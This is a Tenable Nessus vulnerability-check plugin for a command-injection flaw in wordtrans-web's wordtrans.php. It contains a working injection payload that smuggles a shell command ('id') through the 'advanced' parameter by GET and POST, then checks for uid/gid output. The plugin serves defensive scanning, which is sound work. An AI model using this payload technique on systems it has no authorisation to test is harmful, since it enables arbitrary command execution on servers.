#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33391);
  script_version("$Revision: 1.14 $");

  script_bugtraq_id(30027);
  script_osvdb_id(53494);

  script_name(english:"Wordtrans-web exec_wordtrans Function Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using wordtrans-web");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running wordtrans-web, a web-based front-end for
wordtrans, for translating words. 

The version of wordtrans-web installed on the remote host fails to
sanitize input to the 'advanced' parameter of the 'wordtrans.php'
script before using it in an 'passthru()' statement to execute PHP
code.  Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id." );
  # http://web.archive.org/web/20090612001446/http://www.scanit.net/rd/advisories/adv02
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e50a4160" );
  # http://web.archive.org/web/20080914221021/http://www.scanit.net/rd/advisories/adv02_2
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a1f94ce7" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jul/2" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jul/4" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/02");
 script_cvs_date("$Date: 2016/11/02 20:50:26 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:wordtrans:wordtrans-web");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/wordtrans", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the first issue.
  exploit = string('1";', cmd, '; true "');
  url = string(
    dir, "/wordtrans.php?",
    "command=show_desc&",
    "advanced=", urlencode(str:exploit)
  );

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # There's a problem if we see the command output.
  if (egrep(pattern:cmd_pat, string:res))
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host using the following URL :\n",
        "\n",
        build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        output = strstr(res, '<hr size="1">\r\n\r\n') - '<hr size="1">\r\n\r\n';
        output = output - strstr(output, '</body>');
        output = chomp(output);
        if (!egrep(pattern:cmd_pat, string:output)) output = res;

        report = string(
          report,
          "\n",
          "This produced the following output :\n",
          "\n",
          "  ", output
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }

  # If we're sure it's wordtrans-web and the "Perform thorough tests" setting is enabled...
  if (
    thorough_tests &&
    "wordtrans.php?noadvanced=1" >< res
  )
  {
    # Try to exploit the second issue.
    url = string(dir, "/wordtrans.php");
    postdata = string(
      "word=", SCRIPT_NAME, "&",
      "advanced=", urlencode(str:exploit)
    );

    w = http_send_recv3(method: "POST", item: url, port: port,
      content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    if (egrep(pattern:cmd_pat, string:res))
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following URL :\n",
          "\n",
          build_url(port:port, qs:url), "\n",
          "\n",
          "and the following POST data :\n",
          "\n",
          "  ", str_replace(find:"&", replace:'\n  ', string:postdata), "\n"
        );
        if (report_verbosity > 1)
        {
          output = strstr(res, '<hr size="1">\r\n\r\n') - '<hr size="1">\r\n\r\n';
          output = output - strstr(output, '</body>');
          output = chomp(output);
          if (!egrep(pattern:cmd_pat, string:output)) output = res;

          report = string(
            report,
            "\n",
            "This produced the following output :\n",
            "\n",
            "  ", output
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
